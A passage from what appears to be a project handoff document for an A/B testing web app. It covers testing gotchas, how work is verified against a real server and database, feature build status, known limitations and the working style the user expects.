can redirect the frame. If a Content-Security-Policy is ever added to the app, it must allow
framing http(s) pages.

**Headless Chrome is a crawler to the SDK.** Its user agent matches the bot filter, so the SDK
deliberately does nothing. Browser tests of the SDK must set a normal user agent.

**Conversions within 5 seconds of an identical one are dropped** by ingestion's de-duplication
window. A test that fires two conversions back to back will see one.

**Do not `pkill -f "next dev"`.** The pattern matches the wrapper shell running the command and
kills your own process. Use `pkill -f "[n]ext-server"`.

---

## 10. How verification is done here

The user expects each part to be verified against a **running server and a real database**, not
by assertion. The pattern used throughout:

1. Seed fixtures with a throwaway `prisma/_setupN.ts` script
2. Drive the real HTTP surface — find each form in the rendered page and replay its hidden
   fields exactly as a browser with JavaScript disabled would
3. Assert on rendered content and on database rows
4. **Delete the fixtures and the scratch scripts afterwards**
5. Run `npm run check` and `npm run build`

Two-user authorization checks are standard: create a second user, replay the first user's form
with the second user's session, and confirm nothing changed.

**Report failures honestly, including your own harness bugs.** Several "failures" during the
build were bad assertions rather than bad code — say so rather than quietly fixing the test.

---

## 11. Build status

Working, on the design prototype's (v2) UI throughout:

- **Projects** — switcher, create/edit with favicon detection, extra domains, timezone,
  significance threshold, archive/restore/delete, Manage projects page.
- **Experiments** — Split URL and A/B tests, up to five arms, the 6-step wizard (drafts, edit,
  validation, real URL checks, QA + readiness, launch confirmation), visual editor with editable
  CSS selectors and a view-only live page, gated behind a verified install for A/B variants,
  preview modal and real on-site preview links, device targeting in the wizard (the SDK still
  evaluates page rules, audience, countries and query/UTM/referrer conditions on legacy rows),
  coverage, conversion-URL goals with unique/all counting (metric and secondary goals are legacy,
  see §6), pause/resume, end with winner (and keep-redirecting-to-winner), duplicate, delete, live
  edits, activity log, share links.
- **Results** — verdict, scorecards, time-series chart, comparison table with chance to beat
  control, 95% intervals and p-values, per-goal performance, traffic distribution with a sample
  ratio check, head-to-head; the public share page uses the same view.
- **Dashboard** ("Overview", with a client-side CSV export), **Metrics & goals** (metrics table,
  new metric, GTM setup with a real test event), **Installation & tracking** (snippet, Copy, real
  verification of every project domain with failures summarised in one line; no GTM install
  method, as in v2; `InstallModal` has an editor-gate mode via `editorHost` / `onVerified`),
  **Google Sheets export**, **CDN panel** (seam), **Team** (seam).
- **SDK** — v4: redirects, A/B changes, targeting, coverage, `track()`, preview, crawler skip,
  page views, visible time; server-side goal matching.

**Not built:** the production Docker Compose stack and Dockerfile (only `docker-compose.dev.yml`
and reference Nginx configs exist) · team access control (members are stored only) · real CDN
delivery stats · click / custom-JS / form goals beyond `track()` · SPA route-change tracking ·
event retention policy · editing inside the live page (the editor's live view is view-only; edits
happen on a mock canvas and selectors target the real page) · an updated `docs/guide/testing-guide.html`
(it predates the design rebuild).

Known limitations are listed at the end of each `docs/*.md`. The most significant:

- **Rate limiting is per-process** — multiple containers multiply the effective limit
- **Conversions are per-origin** — the assignment lives in `localStorage`, so a goal page on a
  different origin from where the visitor was assigned will not convert
- **Redirect flicker is bounded, not eliminated** — the pasted anti-flickering script lifts
  after `routelyTimeout` (1250 ms), so a config request slower than that still flashes the
  control page. Sites that skip that script keep the flicker entirely
- **One redirect per tab session**, not per visitor

---

## 12. Working style the user expects

- **Verify, do not assert.** Run it against real infrastructure and show the output.
- **Explain the reasoning behind a decision**, especially where an obvious alternative was
  rejected — and say which alternative and why.
- **Flag deviations from the spec explicitly** rather than silently doing something different.
  Several parts deviated for good reasons; each was called out and offered for reversal.
- **Report what failed**, including mistakes in your own test harness.
- **Do not over-build.** Each part had a scope, and "do not implement X yet" was honoured.
- Finish with: files changed, how to test, environment variables, and known limitations.
